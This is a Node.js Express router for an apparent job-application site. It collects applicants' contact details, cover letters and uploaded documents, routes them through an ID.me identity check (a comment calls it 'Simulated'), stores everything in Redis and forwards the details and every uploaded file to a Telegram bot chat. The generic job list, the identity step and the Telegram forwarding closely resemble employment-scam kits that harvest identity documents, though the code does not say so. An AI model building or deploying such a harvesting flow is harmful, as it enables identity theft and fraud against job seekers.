const path = require('path');
const os = require('os');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { Redis } = require('@upstash/redis');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

const JOB_POSITIONS = [
  'Logistics Coordinator / Dispatcher',
  'Supply Chain Analyst',
  'Customer Support / Client Relations',
  'HR / Recruitment / Talent Acquisition',
  'IT / Software Support',
  'Drivers (truck, delivery, fleet)',
  'Warehouse Staff & Forklift Operators',
  'Fleet & Maintenance Supervisors',
  'Virtual Assistance',
  'Account Manager',
  'Project Manager',
  'Data Entry',
  'Customer support',
];

router.get('/', (req, res) => {
  res.render('apply', { positions: JOB_POSITIONS });
});

// Step 1: Receive initial application and store in session
router.post('/start', upload.array('documents', 6), (req, res) => {
  const { firstName, lastName, email, phone, coverLetter, position } = req.body;

  req.session.applicationDraft = {
    firstName,
    lastName,
    email,
    phone,
    coverLetter,
    position,
    files: (req.files || []).map((f) => ({ path: f.path, originalname: f.originalname, mimetype: f.mimetype })),
  };

  res.redirect('/auth/idme');
});

// Step 2: Simulated ID.me verification screen
// Verify step now handled by ID.me OAuth in /auth

// Step 3: Submit and email
router.get('/submit', async (req, res) => {
  if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
  res.render('submit');
});

router.post('/submit', async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;

    const attachments = (data.files || []).map((f) => ({ filename: f.originalname, path: f.path, contentType: f.mimetype }));

    // Store in Upstash Redis
    try {
      const redis = new Redis({
        url: process.env.UPSTASH_REDIS_REST_URL,
        token: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
      const key = `application:${Date.now()}:${(data.email||'').replace(/[^a-zA-Z0-9._-]/g,'_')}`;
      await redis.hset(key, {
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        position: data.position,
        coverLetter: data.coverLetter || '',
        files: JSON.stringify(attachments.map(a=>({ name:a.filename, type:a.contentType }))),
        idme: JSON.stringify(req.session.idme || {}),
        createdAt: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Upstash store failed:', e.message);
    }

    // Send to Telegram
    try {
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      if (botToken && chatId) {
        const summary = `New Application\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: summary }),
        });

        for (const f of attachments) {
          const form = new FormData();
          form.append('chat_id', chatId);
          form.append('document', require('fs').createReadStream(f.path), { filename: f.filename, contentType: f.contentType });
          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
        }
      }
    } catch (e) {
      console.warn('Telegram send failed:', e.message);
    }

    req.session.applicationDraft = null;
    req.session.verified = null;
    res.render('success');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

module.exports = router;

